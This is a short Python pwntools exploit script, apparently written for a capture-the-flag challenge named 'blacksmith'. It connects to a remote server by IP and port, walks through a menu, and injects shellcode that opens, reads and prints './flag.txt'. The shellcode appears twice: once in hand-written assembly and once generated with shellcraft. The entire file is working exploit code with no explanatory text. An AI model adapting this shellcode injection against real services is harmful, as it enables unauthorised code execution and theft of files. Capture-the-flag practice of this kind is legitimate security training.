#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./blacksmith',checksec=False)

#p = process()
p = remote('83.136.250.158',52394)
#gdb.attach(p,gdbscript='''
#           brva 0x0000000000000dd4
#           brva 0x0000000000000de2
#           ''')

shellcode = asm('''
    push 29816
    mov r9,0x742e67616c662f2e
    push r9
    mov rdi,rsp
    xor rsi,rsi
    xor rdx,rdx
    mov al,0x02
    syscall

    mov rdi,rax
    mov rsi,rsp
    sub rsi,0x50
    mov rdx,0x50
    mov al,0
    syscall

    mov rdi,1
    mov al,1
    syscall
    ''',arch='amd64')
pwn_tools = shellcraft.open('./flag.txt')
pwn_tools += shellcraft.read(3,'rsp',100)
pwn_tools += shellcraft.write(1,'rsp',100)
print(len(shellcode))
input()
p.sendlineafter(b'> ',b'1')
p.sendlineafter(b'> ',b'2')
#p.sendlineafter(b'> ',shellcode)
p.sendlineafter(b'> ',asm(pwn_tools))





p.interactive()
